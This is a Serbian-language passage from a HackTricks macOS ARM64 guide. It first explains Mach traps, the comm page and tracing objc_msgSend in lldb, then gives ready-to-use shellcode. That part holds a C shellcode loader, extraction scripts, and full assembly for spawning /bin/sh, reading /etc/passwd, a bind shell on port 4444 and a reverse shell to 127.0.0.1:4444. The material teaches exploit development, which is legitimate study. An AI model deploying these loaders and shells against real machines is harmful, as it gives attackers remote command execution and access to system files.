Pogledajte u [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) `mach_trap_table` i u [**mach\_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach\_traps.h) prototipove. Maksimalan broj Mach zamki je `MACH_TRAP_TABLE_COUNT` = 128. Mach zamke će imati **x16 < 0**, pa je potrebno pozvati brojeve sa prethodne liste sa **minusom**: **`_kernelrpc_mach_vm_allocate_trap`** je **`-10`**.

Takođe možete proveriti **`libsystem_kernel.dylib`** u disassembleru da biste saznali kako pozvati ove (i BSD) sistemski pozivi:

{% code overflow="wrap" %}
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

{% hint style="success" %}
Ponekad je lakše proveriti **dekompilovani** kod iz **`libsystem_kernel.dylib`** **nego** proveravati **izvorni kod** jer je kod nekoliko sistemskih poziva (BSD i Mach) generisan putem skripti (proverite komentare u izvornom kodu), dok u dylib datoteci možete pronaći šta se poziva.
{% endhint %}

### machdep pozivi

XNU podržava još jednu vrstu poziva nazvanih zavisnih od mašine. Broj ovih poziva zavisi od arhitekture i ni pozivi ni brojevi nisu zagarantovani da će ostati konstantni.

### comm stranica

Ovo je stranica memorije vlasništvo jezgra koja je mapirana u adresni prostor svakog korisničkog procesa. Namena joj je da ubrza prelazak iz režima korisnika u prostor jezgra brže nego korišćenjem sistemskih poziva za jezgrene usluge koje se toliko koriste da bi taj prelazak bio veoma neefikasan.

Na primer, poziv `gettimeofdate` čita vrednost `timeval` direktno sa comm stranice.

### objc\_msgSend

Veoma je često naći ovu funkciju korišćenu u Objective-C ili Swift programima. Ova funkcija omogućava pozivanje metode objekta Objective-C.

Parametri ([više informacija u dokumentaciji](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Pokazivač na instancu
* x1: op -> Selektor metode
* x2... -> Ostali argumenti pozvane metode

Dakle, ako postavite prekidnu tačku pre grananja ka ovoj funkciji, lako možete pronaći šta je pozvano u lldb- u (u ovom primeru objekat poziva objekat iz `NSConcreteTask` koji će pokrenuti komandu):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
{% hint style="success" %}
Postavljanjem env promenljive **`NSObjCMessageLoggingEnabled=1`** moguće je zabeležiti kada je ova funkcija pozvana u datoteci poput `/tmp/msgSends-pid`.

Osim toga, postavljanjem **`OBJC_HELP=1`** i pozivanjem bilo kog binarnog fajla možete videti druge okoline promenljive koje biste mogli koristiti za **zabeležavanje** kada se određene Objc-C akcije dese.
{% endhint %}

Kada je ova funkcija pozvana, potrebno je pronaći pozvanu metodu naznačene instance, za to se vrše različite pretrage:

* Izvršiti optimističku pretragu keša:
* Ako je uspešno, završeno
* Steći runtimeLock (čitanje)
* Ako (realizovati && !cls->realized) realizovati klasu
* Ako (inicijalizovati && !cls->initialized) inicijalizovati klasu
* Pokušati sa kešom klase:
* Ako je uspešno, završeno
* Pokušati sa listom metoda klase:
* Ako je pronađeno, popuniti keš i završeno
* Pokušati sa kešom nadklase:
* Ako je uspešno, završeno
* Pokušati sa listom metoda nadklase:
* Ako je pronađeno, popuniti keš i završeno
* Ako (resolver) pokušati sa rešavačem metoda, i ponoviti od pretrage klase
* Ako ste i dalje ovde (= sve ostalo nije uspelo) pokušati sa preusmerivačem

### Shellkodovi

Za kompilaciju:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Da izvučemo bajtove:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Za novije macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C kod za testiranje shell koda</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto sa [**ovde**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i objašnjeno.

{% tabs %}
{% tab title="sa adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="sa stekom" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}

{% tab title="sa adr za linux" %}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
#### Čitanje pomoću cat

Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (što u memoriji znači stek adresa).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Pozovite komandu sa sh iz fork-a tako da glavni proces nije ubijen
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell sa [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **portu 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Sa [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{% hint style="success" %}
Učite i vežbajte hakovanje AWS-a: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks obuka AWS Crveni Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks obuka GCP Crveni Tim Ekspert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
